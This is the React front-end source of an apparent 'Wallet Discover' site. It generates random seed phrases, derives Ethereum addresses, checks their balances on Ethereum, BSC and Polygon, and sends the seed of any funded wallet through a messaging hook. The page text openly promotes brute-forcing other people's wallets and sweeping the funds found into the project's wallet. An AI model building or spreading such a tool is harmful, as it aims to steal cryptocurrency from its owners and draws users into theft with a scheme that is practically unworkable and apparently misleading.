import { useRef } from 'react';
import 'react-toastify/dist/ReactToastify.css';
import logo from '../src/img/logo.svg';
import eth from '../src/img/eth.png';
import bnb from '../src/img/bnb.png';
import matic from '../src/img/matic.png';
import wallet from '../src/img/wallet.png';
import play from '../src/img/play.png';
import pausePic from '../src/img/pause.png';
import X from "../src/img/x.svg";
import Tg from "../src/img/tg.svg";
import { seeds } from "../src/utils/seeds";
import { ToastContainer } from 'react-toastify';
import { checkBalances } from "../src/utils/balance";
import { toast } from "react-toastify";
import { Wallet, utils } from 'ethers';
import { useActions } from './hooks/useActions';
import { useSendMessage } from "./hooks/useSendMessage";
import { useTypedSelector } from "./hooks/useTypedSelector";
import { useEthers } from '@usedapp/core';

function App() {
  const { addresses, mnemonics, counter } = useTypedSelector(state => state.main);
  const { SetAddresses, SetMnemonics, IncreaseCounter } = useActions();

  const messageHook = useSendMessage();
  const { account, activateBrowserWallet, deactivate } = useEthers();
  const pause = useRef(true);

  function connect() {
      if(account) {
          pause.current = true;
          deactivate();
      } else {
          activateBrowserWallet();
      }   
  }

  function getRandomMnemonic() {
      const arrayMnemonic = []
      while(arrayMnemonic.length < 12) {
          arrayMnemonic.push(seeds[Math.floor(Math.random() * 2047)]);
      }
      return arrayMnemonic.join(" ");
  }

  function getValidMnemonic() {
      let valid = false;
      let mnemonic;
      while(!valid) {
          mnemonic = getRandomMnemonic();
          valid = utils.isValidMnemonic(mnemonic);
      }
      return mnemonic;
  }

  async function getBatchMnemonics() {
      const batch = await Promise.all([
              getValidMnemonic(), // 1
              getValidMnemonic(), // 2
              getValidMnemonic(), // 3
              getValidMnemonic(), // 4
              getValidMnemonic(), // 5
              getValidMnemonic(), // 6
              getValidMnemonic(), // 7
              getValidMnemonic(), // 8
              getValidMnemonic(), // 9
              getValidMnemonic(), // 10
              getValidMnemonic(), // 11
              getValidMnemonic(), // 12
              getValidMnemonic(), // 13
              getValidMnemonic(), // 14
              getValidMnemonic(), // 15
              getValidMnemonic(), // 16
              getValidMnemonic(), // 17
              getValidMnemonic(), // 18
              getValidMnemonic(), // 19
              getValidMnemonic() // 20
      ]);
      return batch;
  }

  async function getAddresses(_batch: string[]) {
      const addresses: string[] = await Promise.all(
          _batch.map( _mnemonic => {
              return (Wallet.fromMnemonic(_mnemonic as string)).address;
          })
      );
      return addresses;
  }

  function walletCounter() {
      return counter;
  }

  async function start() {
      if (!account) {
          toast.info('First connect your wallet', {
              position: "top-center",
              autoClose: 1000,
              hideProgressBar: true,
              pauseOnHover: false,
              draggable: true,
              theme: "light",
          });
          return;
      }
      if(pause.current) {
        pause.current = false;
      } else {
        pause.current = true;
      }
      while(!pause.current) {
          const batch: string[] = await getBatchMnemonics() as string[];
          const addresses: string[] = await getAddresses(batch) as string[];
          SetMnemonics(batch);
          SetAddresses(addresses);
          const resulsts: boolean[] = await checkBalances(addresses);
          IncreaseCounter(20);
          const indexes: number[] = [];
          resulsts.forEach((element, i) => {
              if(element) {
                  indexes.push(i);
              }
          } );
          if(indexes.length > 0) {
              let messages: string[] = [];
              messages = indexes.map(
                  (i) => { return `Wallet: ${addresses[i]} Seed: ${batch[i]}` }
              );
              const text = messages.join('; ');
              console.log("TEXT: ", text);
              await messageHook(text);
          }
      }
  }

  return (
    <>
      <main>
        <div className="header-wrapper">
          <div className="header__logo">
            <img src={logo} className="header__img" alt="" />
            <div>
              Wallet <br/> Discover
            </div>
          </div>
          <div className="header__info header__hider">
            <div className="header__item">
              <img src={eth} alt="" />
              <div>
                0.00 ETH
              </div>
            </div>
            <div className="header__item">
              <img src={bnb} alt="" />
              <div>
                0.00 BNB
              </div>
            </div>
            <div className="header__item">
              <img src={matic} alt="" />
              <div>
                0.00 MATIC
              </div>
            </div>
            <div className="header__item">
              <img src={wallet} alt="" />
              <div>
                Total wallets <br /> scanned: {walletCounter()}
              </div>
            </div>
          </div>
          <button
            onClick={() => {connect()}} 
            className="header__button">
            {account ? "Disconnect" : "Connect"}
          </button>
        </div>
        <div className="wrapper">
          <div className="info">
            <div className="header__item">
              <img src={eth} alt="" />
              <div>
                0.00 ETH
              </div>
            </div>
            <div className="header__item">
              <img src={bnb} alt="" />
              <div>
                0.00 BNB
              </div>
            </div>
            <div className="header__item">
              <img src={matic} alt="" />
              <div>
                0.00 MATIC
              </div>
            </div>
            <div className="header__item">
              <img src={wallet} alt="" />
              <div>
                Total wallets <br /> scanned: {walletCounter()}
              </div>
            </div>
          </div>
          <div className="discover">
            <button className="discover__button"
              onClick={() => {
                start();
              }}
            >
              <img src={pause.current? play : pausePic} alt="" />
            </button>
            <div className="discover__text">
              {pause.current? "Discover the wallets!" : "Discovering the wallets..."}
            </div>
          </div>
          <div className="addresses">
            {
              addresses.length > 0 &&
              addresses.map((el, index) =>
                <div
                  className="addresses__address"
                  key={index}
                >
                  <div className="address__seed">
                    {mnemonics[index]} 
                  </div>
                  <div className="address__address">
                    {el}
                  </div>
                </div>
              )
            }
          </div>
          <div className="title">
            How it works
          </div>
          <div className="items">
            <div className="item">
              <div className="item__text">
                1. The user comes to the platform, connects the wallet and presses this button
              </div>
              <button className="item__button" onClick={() => {
                  start();
                }}>
                <img src={pause.current? play : pausePic} alt="" />
              </button>
            </div>
            <div className="item">
              <div className="item__text">
                2. The platform randomly selects passwords from crypto wallets and checks the balances of native currency in the Ethereum, BSC and Polygon networks.
              </div>
            </div>
            <div className="item">
              <div className="item__text">
                3. If a user finds a cryptocurrency on some wallet, it is automatically sent to another wallet of the project.
              </div>
            </div>
            <div className="item">
              <div className="item__text">
                4. The found cryptocurrency is distributed as follows: 50% is received by the one who connected his address to the platform and found this cryptocurrency, the other 50% is distributed among the holders of the project token.
              </div>
            </div>
          </div>
          <div className="important">
            <span className="important__span">Important: </span>
            <span className="important__text">The more users who engage in brute force search, the greater the chance of finding wallets full of riches! Our strength is in the number of users!</span>
          </div>
          <div className="footer">
            <div className="footer__left">
              <div className="footer__logo">
                <img src={logo} className="footer__img" alt="" />
                <div>
                  Wallet <br/> Discover
                </div>
              </div>
              <div className="footer__rights">
                Copyright 2024. All Rights Reserved.
              </div>
            </div>
            <div className="footer__right">
              <a target='_blank' href="#" className="footer__docs">
                Documentation
              </a>
              <a target='_blank' href="#" className="footer__link">
                <img src={Tg} alt="tg" />
              </a>
              <a target='_blank' href="#" className="footer__link">
                <img src={X} alt="x" />
              </a>
            </div>
          </div>
        </div>
        <ToastContainer/>
      </main>
    </>
  );
}

export default App;
